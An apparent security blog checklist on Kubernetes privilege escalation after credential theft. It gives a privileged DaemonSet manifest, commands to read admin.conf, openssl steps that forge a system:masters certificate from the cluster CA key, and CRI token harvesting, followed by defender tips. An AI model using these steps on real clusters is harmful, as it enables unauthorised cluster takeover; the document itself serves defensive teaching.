# From Recon to Root: Kubernetes Credential Compromise Checklist

> 🚨 What happens *after* an attacker steals credentials?  
> This is the real danger—especially in Kubernetes.  
> This guide walks through exactly what an attacker can do next… and how defenders can shut it down.

---

## 🧠 Step 1: Assess What Access You Have

If you've gained access to a user account or service token, your first move is to understand what it's capable of.

### Use `kubectl`:

```bash
kubectl auth can-i --list
```

Or use rakkess:

```bash
rakkess --as <user>
```

This reveals the full RBAC permissions of the compromised identity—your map of what’s possible next.

🚀 Step 2: Privilege Escalation Techniques
Based on what rights are available, these are the most common attacker paths to cluster admin.

🔧 Option A: Create a DaemonSet and Exec Into It
If the compromised user can create daemonsets and exec into pods, this is a quick route to full cluster access.

```yaml

# Minimal DaemonSet YAML for pod exec access
apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: root-daemon
spec:
  selector:
    matchLabels:
      name: root-daemon
  template:
    metadata:
      labels:
        name: root-daemon
    spec:
      containers:
        - name: root
          image: alpine
          command: ["sh", "-c", "sleep infinity"]
          securityContext:
            privileged: true
```

Then exec into each pod:

```bash
kubectl exec -it <pod-name> -- /bin/sh
```


If you're lucky and land on a control plane node, you can try to grab:

```bash
/etc/kubernetes/admin.conf
```
Or mint your own cert:

```bash
openssl genrsa -out user1.key 2048
openssl req -new -key user1.key -out user1.csr -subj "/CN=user1/O=system:masters"
openssl x509 -req -in user1.csr -CA /etc/kubernetes/pki/ca.crt -CAkey /etc/kubernetes/pki/ca.key -CAcreateserial -out user1.crt
```

This gives you cluster-admin access.

🔥 Option B: Pod Exec with Control Plane Targeting
If DaemonSets aren't allowed, but Pod creation is:

1. List nodes:

```bash
kubectl get nodes
```

2. Create a Pod with nodeName: set to a control plane node

3. Use tolerations to bypass taints like NoSchedule

4. kubectl exec to gain access and start exploring

🧪 Option C: Steal Tokens at Runtime (CRI Abuse)
With privileged container access on any node, use Docker or CRI to enumerate and inspect containers.

```bash
docker ps
docker inspect <container>
```

Or:

```bash
crictl ps
crictl inspect <container>
```

Look for mounted service account tokens with elevated privileges.

🕵️‍♂️ Defender Tips: How to Detect & Prevent This
✅ Restrict RBAC
Avoid create permissions on sensitive objects like Pods, DaemonSets, Roles, ClusterRoles.

✅ Use PodSecurity Policies (PSPs) or OPA Gatekeeper
Disallow privileged pods, enforce container-level restrictions.

✅ Audit Logs

Watch for:

kubectl exec

New DaemonSet creation

Pod creation on control plane nodes

✅ Rotate Tokens and Certificates
Short-lived tokens reduce the window for abuse.

✅ Use Tools Like:

kubeaudit

rakkess

kube-hunter

💬 Final Thoughts
Attackers don't need exploits—just access.

And with most breaches starting at the identity layer, this is where your defenses must begin. If you're serious about Kubernetes security, reconnaissance and misconfigured RBAC should keep you up at night.

—

🔒 Need help securing your Kubernetes or IAM setup? Book a free review

© Red Dog Security – Use, remix, and improve this with attribution. Licensed under MIT.
